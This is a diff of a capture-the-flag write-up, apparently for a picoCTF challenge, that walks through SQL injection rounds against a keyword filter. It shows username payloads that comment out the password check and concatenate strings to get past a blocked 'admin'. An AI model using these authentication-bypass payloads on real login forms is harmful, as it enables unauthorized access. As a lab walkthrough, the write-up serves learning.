@@ -46,7 +46,8 @@ Because the last round didn’t mention that the same expression couldn’t be u
 **Username-** admin’/*
 **Password-** k
 
-SELECT * FROM users WHERE username='admin'/*' AND password='k'
+The query is now,
+```SELECT * FROM users WHERE username='admin'/*' AND password='k'```
 
 On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, it shows ```Round4: or and = like > < -- admin```
 
@@ -55,8 +56,8 @@ On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, it shows 
 **Username-** admi'||'n'/*
 **Password-** yes
 
-Use ```||``` to concatenate ```admi``` and ```n```
-SELECT * FROM users WHERE username='admi'||'n'/*' AND password=‘yes'
+Use ```||``` to concatenate ```admi``` and ```n``` so the query is now,
+```SELECT * FROM users WHERE username='admi'||'n'/*' AND password=‘yes'```
 
 On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, it shows ```Round5: or and = like > < -- union admin```
 
@@ -68,7 +69,8 @@ Because the last round didn’t mention that the same expression couldn’t be u
 **Username-** admi'||'n'/*
 **Password-** done
 
-SELECT * FROM users WHERE username='admi'||'n'/*' AND password=‘done'
+The query is now, 
+```SELECT * FROM users WHERE username='admi'||'n'/*' AND password=‘done'```
 
 On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, we finally get the flag. 
 
